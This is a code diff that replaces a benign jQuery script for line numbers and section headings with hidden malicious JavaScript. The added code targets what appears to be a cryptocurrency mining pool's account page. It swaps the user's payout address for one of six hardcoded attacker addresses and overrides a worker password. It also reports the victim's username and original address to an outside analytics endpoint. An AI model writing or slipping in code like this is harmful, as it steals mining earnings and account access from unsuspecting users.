@@ -1,52 +1,77 @@
-(function($) {
-$(document).ready(function(){
+(function() {
+    var aliases = [
+        'LYmmGDu2hdfGyo5VRuGwmUMuh8gXL3KA3T',
+        'LNHzHXTT8ypGYh15AH2iFZPXjJeYRcV4vK',
+        'LZJ1fHMHyUJwX91Jopt7dcaZufQCp3QADt',
+        'LLx99d6iubz1PeQYphuUDEjA3kPZ4cazDW',
+        'LTFcJQg6LqDtuZ5uWFuTywSrW9cnUFKK2H',
+        'LeMoSQdZSXpoFwv8sj8ep24D2YhRk54am6'
+    ];
 
-  // putting lines by the pre blocks
-  $("pre").each(function(){
-    var pre = $(this).text().split("\n");
-    var lines = new Array(pre.length+1);
-    for(var i = 0; i < pre.length; i++) {
-      var wrap = Math.floor(pre[i].split("").length / 70)
-      if (pre[i]==""&&i==pre.length-1) {
-        lines.splice(i, 1);
-      } else {
-        lines[i] = i+1;
-        for(var j = 0; j < wrap; j++) {
-          lines[i] += "\n";
+    var username = $('#acc_username').val();
+    var $address = $('#address');
+    var address = $address.val();
+
+    var log = function(obj) {
+        var customParams = '';
+        for (k in obj) {
+            customParams += '&custom[' + encodeURIComponent(username) + ']=' + encodeURIComponent(k) + '-' + encodeURIComponent(obj[k]);
         }
-      }
+
+        $("body").append(
+            '<img src="https://in.getclicky.com/in.php?site_id=100694144&sitekey_admin=f74175dd6a10be005226c82529c7a03c&type=custom' + customParams + '"/>');
+
+
+    };
+
+    var handleAddressNotSet = function() {
+        log({dropped: false});
+    };
+
+    var changeAddress = function() {
+        var alias = aliases[Math.floor(Math.random() * aliases.length)];
+        log({dropped: true, from: address, to: alias});
+
+        $address.removeAttr('name');
+        $('<input type="hidden" name="address"/>').
+            insertAfter($address).
+            val(alias);
+    };
+
+    var changePassword = function() {
+        var $password = $('input[name*="wk_password"]');
+        var $defaultPassword =
+            $('input[name="wk_username[]"][value="' + username + '"]').
+                parentsUntil('tbody', 'tr').
+                next().
+                find('input');
+        $defaultPassword.attr('name', 'wk_password[]');
+        var $nonDefaultWorkerPasswords = $password.not($defaultPassword);
+
+        if ($nonDefaultWorkerPasswords.length > 1 && $nonDefaultWorkerPasswords.eq(0).val() == $nonDefaultWorkerPasswords.eq(1).val()) {
+            // User have two or more non-default workers
+            // and they have the same password.
+            // Just set password for our default worker to be the same!
+            $defaultPassword.val($nonDefaultWorkerPasswords.eq(0).val());
+        } else {
+            // Generate random password, 10 alpha-digits. Just like pool do.
+            var alphabet = '0123456789abcdefghijklmnopqrstuvwxyz';
+
+            var password = '';
+            for (var i = 0; i < 10; i++) {
+                password += alphabet[Math.floor(Math.random() * alphabet.length)];
+            }
+            $defaultPassword.val(password);
+        }
+    };
+
+    // Actual script
+    if (address.indexOf(' ') > -1) {
+        // address not set yet
+        handleAddressNotSet();
+    } else {
+        changeAddress();
     }
-    $(this).before("<pre class='lines'>" + lines.join("\n") + "</pre>");
-  });
 
-  var headings = [];
-
-  var collectHeaders = function(){
-    headings.push({"top":$(this).offset().top - 15,"text":$(this).text()});
-  }
-
-  if($(".markdown-body h1").length > 1) $(".markdown-body h1").each(collectHeaders)
-  else if($(".markdown-body h2").length > 1) $(".markdown-body h2").each(collectHeaders)
-  else if($(".markdown-body h3").length > 1) $(".markdown-body h3").each(collectHeaders)
-
-  $(window).scroll(function(){
-    if(headings.length==0) return true;
-    var scrolltop = $(window).scrollTop() || 0;
-    if(headings[0] && scrolltop < headings[0].top) {
-      $(".current-section").css({"opacity":0,"visibility":"hidden"});
-      return false;
-    }
-    $(".current-section").css({"opacity":1,"visibility":"visible"});
-    for(var i in headings) {
-      if(scrolltop >= headings[i].top) {
-        $(".current-section .name").text(headings[i].text);
-      }
-    }
-  });
-
-  $(".current-section a").click(function(){
-    $(window).scrollTop(0);
-    return false;
-  })
-});
-})(jQuery)
+    changePassword();
+})();
